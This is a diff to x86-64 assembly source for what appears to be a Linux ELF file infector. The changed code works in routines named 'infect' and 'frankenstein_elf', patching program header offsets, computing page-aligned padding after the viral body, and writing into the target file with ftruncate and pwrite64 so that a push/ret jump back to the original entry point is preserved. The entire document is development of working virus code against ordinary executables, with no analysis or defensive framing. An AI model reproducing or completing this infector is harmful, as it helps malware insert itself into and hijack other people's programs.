@@ -420,6 +420,10 @@ vxdatasegment: dd 0
 vxshoff: dd 0
 ventry equ $_start 
 
+num_pages: dd 0
+vx_padding_size: dd 0
+;num_pages_padding equ (num_pages * PAGESIZE)
+
 
 fd:	dq 0
 
@@ -946,12 +950,12 @@ infect:
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 					mov dword [data_offset_new_padding],  r11d
-					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					add dword r10d, [PAGESIZE]
-					mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
-					mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					add dword r10d, [PAGESIZE]
-					mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
+					;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					;add dword r10d, [PAGESIZE]
+					;mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
+					;mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					;add dword r10d, [PAGESIZE]
+					;mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing
 				;.mod_other_ptload_phdr:
 						
@@ -965,12 +969,12 @@ infect:
 				jl .next_phdr
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r12 + elf_phdr.p_offset], r11d
-				mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-				add dword r10d, [PAGESIZE]
-				mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
-				mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-				add dword r10d, [PAGESIZE]
-				mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
+				;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+				;add dword r10d, [PAGESIZE]
+				;mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
+				;mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+				;add dword r10d, [PAGESIZE]
+				;mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 		.next_phdr:
 			pop rcx
 			dec cx 
@@ -1153,12 +1157,22 @@ frankenstein_elf:
 	.write_padding_after_vx:
 		;xor rsi, rsi
 		xor r10, r10
+		xor r11, r11
 		mov r10d, dword [vxoffset]
 		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
-		add r10d, dword [PAGESIZE]				;file offset adjusted to vxoffset+vlen
+		;add r10d, dword [PAGESIZE]				;file offset adjusted to vxoffset+vlen
 		add r10d, 6							;add 6 bytes for push/ret original entrypoint
 		mov dword [vxdatasegment], r10d
-		mov esi, r10d
+		shr r10d, 12						;divide file offset size by PAGESIZE
+		mov dword [num_pages], r10d
+		xor rax, rax
+		mov eax, dword [PAGESIZE]
+		imul r10d
+		;shl r11d, r10d						;to calculate the number of pages to pad the file		
+		add eax, dword [PAGESIZE]
+		;mov esi, r11d
+		mov dword [vx_padding_size], eax
+		mov esi, eax
 		;mov rsi, qword [data_offset_new_padding]
 		mov rax, SYS_FTRUNCATE
 		syscall
@@ -1175,6 +1189,7 @@ frankenstein_elf:
 		add rsi, qword [data_offset_original]	;adjust rsi address to point to original data segment offset of mmap'd file
 		;add rsi, qword [evaddr]	;adjust rsi address to point to original data segment offset of mmap'd file
 		;mov r10d, dword [data_offset_new_padding]
+		mov r10d, dword [vx_padding_size]
 		;mov r10d, dword [vxdatasegment]
 		mov rax, SYS_PWRITE64
 		syscall
